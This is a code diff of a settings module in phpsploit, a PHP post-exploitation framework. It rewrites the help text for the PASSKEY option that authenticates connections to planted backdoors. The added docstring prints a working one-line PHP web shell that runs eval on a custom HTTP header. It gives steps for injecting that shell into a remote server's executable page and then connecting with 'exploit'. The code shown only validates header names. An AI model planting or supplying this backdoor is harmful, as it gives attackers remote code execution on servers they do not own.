@@ -1,35 +1,37 @@
 """
-A password like backdoor protection setting.
+HTTP Header to use as main phpsploit payload stager for RCE.
 
-This passkey is used by the $BACKDOOR setting
-and phpsploit's http tunneling mechanisms as
-the mains dynamic payload dispatcher, based on
-a special header.
+PASSKEY is used by BACKDOOR setting, and phpsploit's http
+tunnel mechanisms as the main payload stager & dispatcher.
 
-While exploiting a phpsploit remote TARGET, this
-setting must have the same value than the one
-used when the remote backdoor was set.
+While exploiting a remote TARGET with phpsploit, make sure
+PASSKEY have the same value as the one it had when backdoor
+had been generated.
 
-Indeed, permanently changing the $PASSKEY value
-from the default one to another value of your choice
-ensures that other phpsploit users will not be able
-to connect to your personnal backdoors without
-knowlege of your $PASSKEY.
+* AUTHENTICATION FEATURE:
+It is recommended that you permanently change PASSKEY value
+to a custom value for authentication purposes.
+Indeed, having a custom PASSKEY value ensures that other
+phpsploit users will not be able to connect to your installed
+backdoor without the knowledge of it's value.
 
-Permanent change of the PASSKEY's default value is
-then highly recommended. This can be done by adding
-'set PASSKEY <yourPasskey>' to the phpsploit
-configuration file.
+* EXAMPLE: Use a custom PASSKEY to prevent unauthorized access
+> set PASSKEY Custom123
+> exploit
+# [*] Current backdoor is: <?php @eval($_SERVER['HTTP_CUSTOM123']); ?>
+# To run a remote tunnel, the backdoor shown above must be
+# manually injected in a remote server executable web page.
+# Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
 """
 import re
 
-import objects
+import linebuf
 
 
-type = objects.buffers.MultiLineBuffer
+linebuf_type = linebuf.MultiLineBuffer
 
 
-def setter(value):
+def validator(value):
     value = str(value)
     reserved_headers = ['host', 'accept-encoding', 'connection',
                         'user-agent', 'content-type', 'content-length']
